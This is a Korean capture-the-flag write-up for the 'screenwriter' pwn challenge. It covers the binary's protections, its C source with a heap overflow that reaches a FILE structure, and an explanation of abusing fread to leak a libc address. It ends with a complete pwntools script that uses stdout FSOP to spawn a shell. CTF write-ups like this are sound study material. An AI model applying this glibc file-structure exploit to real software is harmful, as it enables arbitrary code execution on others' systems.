```
pwn 1 upsolving
```

# 목차

1.  pwn / sceenwriter
    -   보호기법
    -   프로그램 분석
    -   익스플로잇 설계
    -   dec.py

---

# pwn / screenwriter

## 보호기법

```bash
[*] '/mnt/c/Users/a/Desktop/screenwriter/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

PIE가 안 걸려있다.

## 프로그램 분석

```C
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void init(){
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    return;
}

void menu(){
    puts("1. Set screenwriter name");
    puts("2. Write script");
    puts("3. View reference");
    puts("4. Exit");
}

int get_choice(){
    char tmp[5] = "";
    printf("Choice: ");
    fgets(tmp,4,stdin);
    return atoi(tmp);
}

void main(){
    init();
    char* name = malloc(0x28);
    FILE *ref_script = fopen("bee-movie.txt","r");
    FILE *own_script = fopen("script.txt","w");
    puts("Welcome to our latest screenwriting program!");

    while (true){
        int choice = 0;
        menu();

        switch (get_choice()) {
            case 1:
                printf("What's your name: ");
                read(0,name,0x280);
                break;        

            case 2:
                char own_buf[0x101] = "";
                printf("Your masterpiece: ");
                read(0,own_buf,0x100);
                fwrite(own_buf,1,0x100,own_script);
                break;

            case 3:
                char ref_buf[0x11] = "";
                memset(ref_buf,0,0x11);
                fread(ref_buf,1,0x10,ref_script);
                puts("From the reference:");
                puts(ref_buf);
                break;

            default:
                printf("Goodbye %s",name);
                exit(0);
        }
    }
}
```

name을 heap에 선언하고, `fopen`으로 두 파일을 연다. case 1에서 `heap overflow`가 발생하고, case 3에 fread 후 puts 가 있다.  
case 2가 중요하지 않은 이유는 case 1에서 0x280 만큼만 입력받기 때문이다. 0x280으로는 own\_script의 fileno에 접근할 수 없다.

## 익스플로잇 설계

`fread` 내부에서 `_IO_file_xsgetn` 을 호출한다.

```C
_IO_file_xsgetn (FILE *fp, void *data, size_t n)
{
  size_t want, have;
  ssize_t count;
  char *s = data;

  want = n;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
    {
      free (fp->_IO_save_base);
      fp->_flags &= ~_IO_IN_BACKUP;
    }
      _IO_doallocbuf (fp);
    }

  while (want > 0)
    {
      have = fp->_IO_read_end - fp->_IO_read_ptr;
      if (want <= have)
    {
      memcpy (s, fp->_IO_read_ptr, want);
      fp->_IO_read_ptr += want;
      want = 0;
    }
      else
    {
      if (have > 0)
        {
          s = __mempcpy (s, fp->_IO_read_ptr, have);
          want -= have;
          fp->_IO_read_ptr += have;
        }
        ...
        ...
```

\_IO\_read\_ptr을 e.got\['puts'\]으로 설정했다고 하자. \_IO\_read\_end를 e.got\['puts'\] + 8로 설정한 경우 while문 들어가자마자 memcpy로 puts@got을 가져오고, \_IO\_read\_end를 설정하지 않아 NULL인 경우, while -> else if 에서 \_\_mempcpy에서 puts@got을 가져온다. 따라서 `fread`로 puts@got을 가져올 수 있는 것이다. case 3에서 ref\_buf를 출력하므로 libc\_base를 leak할 수 있다.  
다음은 \_IO\_buf\_base와 \_IO\_buf\_end를 조작하고, fileno를 0으로 바꾸면 원하는 곳에 입력할 수 있음을 이용하여 stdout FSOP를 해주면 된다.

## dec.py

```python
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

#p = remote('43.217.80.203', 34981)
p = process('./chall')
e = ELF('./chall')
l = ELF('./libc.so.6')

#gdb.attach(p, 'b *0x401459')

payload = b'a' * 0x28 + p64(0x1e1) + p64(0xfbad2488)
payload += p64(e.got['puts']) # read_ptr
payload += p64(e.got['puts'] + 8) # read_end
#payload += p64(e.got['puts']) # read_base
p.sendlineafter(b': ', b'1')
p.sendafter(b': ', payload)
p.sendlineafter(b': ', b'3')
p.recvline()
l.address = u64(p.recvn(6).ljust(8, b'\x00')) - l.sym['puts']
print(hex(l.address))

stdout_lock = l.address + (0x00007f377515ca70 - 0x7f3774f41000)
fake_fsop_struct = l.sym['_IO_2_1_stdout_']
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stdout_lock,
    _wide_data=fake_fsop_struct - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
    _mode=0xFFFFFFFF,
)

payload = b'a' * 0x28 + p64(0x1e1) + p64(0xfbad2488) + p64(0) * 6 + p64(l.sym['_IO_2_1_stdout_']) + p64(l.sym['_IO_2_1_stdout_'] + 0x100)
payload += p64(0) * 6

p.sendlineafter(b': ', b'1')
p.sendafter(b': ', payload)
p.sendlineafter(b': ', b'3')
sleep(1)
p.send(FSOP)
p.interactive()
```